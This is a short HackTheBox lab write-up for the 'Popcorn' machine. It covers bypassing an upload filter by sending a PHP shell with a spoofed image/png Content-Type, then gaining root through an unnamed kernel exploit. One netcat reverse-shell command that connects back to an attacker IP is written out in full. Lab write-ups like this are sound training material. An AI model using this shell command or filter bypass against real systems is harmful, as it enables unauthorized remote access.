# Popcorn — HackTheBox (write-up)

**Difficulty:** Medium
**Box:** Popcorn (HackTheBox)
**Author:** dsec
**Date:** 2024-12-23

---

## TL;DR

### Torrent hosting site allowed file upload. Bypassed upload filter by changing Content-Type to `image/png` when uploading a PHP shell as a "screenshot." Kernel exploit (Linux 2.6.31) for root.
---
## Target info

- Host: `popcorn.htb`
- Kernel: `Linux 2.6.31-14-generic-pae`
---
## Enumeration

![Nmap results](images/popcorn-htb_1.png)

Added `popcorn` to `/etc/hosts`.

![Web page](images/popcorn-htb_2.png)

![Directory listing](images/popcorn-htb_3.png)

```bash
feroxbuster -u http://popcorn.htb
```

![Feroxbuster results](images/popcorn-htb_4.png)

Found `/torrent/` -- a torrent hosting application.

---
## Foothold

Created an account, logged in, uploaded a `.torrent` file (only format accepted). Tried editing filename extension and content-type of a PHP shell directly -- no luck. Upload filters are typically based on file extension, Content-Type header, or magic bytes.

After uploading a `.torrent`, clicked browse:

![Browse torrents](images/popcorn-htb_5.png)

Clicked on the torrent:

![Torrent details](images/popcorn-htb_6.png)

Edit this torrent -- allows uploading a "screenshot":

![Edit screenshot](images/popcorn-htb_7.png)

Used Burp to change Content-Type to `image/png` while uploading a PHP shell. Extension change alone didn't work, but Content-Type bypass did.

The `/torrent/upload` directory showed the PHP file with a hashed name:

![Upload directory](images/popcorn-htb_8.png)

Triggered the shell:

![Reverse shell](images/popcorn-htb_9.png)

```bash
nc -c sh 10.10.14.172 9001
```

![Shell as www-data](images/popcorn-htb_10.png)

Grabbed `user.txt` from `/home/george`.

---
## Privesc

![motd.legal-displayed](images/popcorn-htb_11.png)

![Kernel info](images/popcorn-htb_12.png)

Used a kernel exploit for the old Linux version (2.6.31):

![Root shell](images/popcorn-htb_13.png)

Could have also used Dirty COW given the kernel version.

---
## Lessons & takeaways

- Upload filters based only on Content-Type are trivially bypassed with Burp
- When direct upload is blocked, look for secondary upload functions (screenshots, avatars, etc.)
- Very old kernels (2.6.x) are almost always vulnerable to public kernel exploits
---
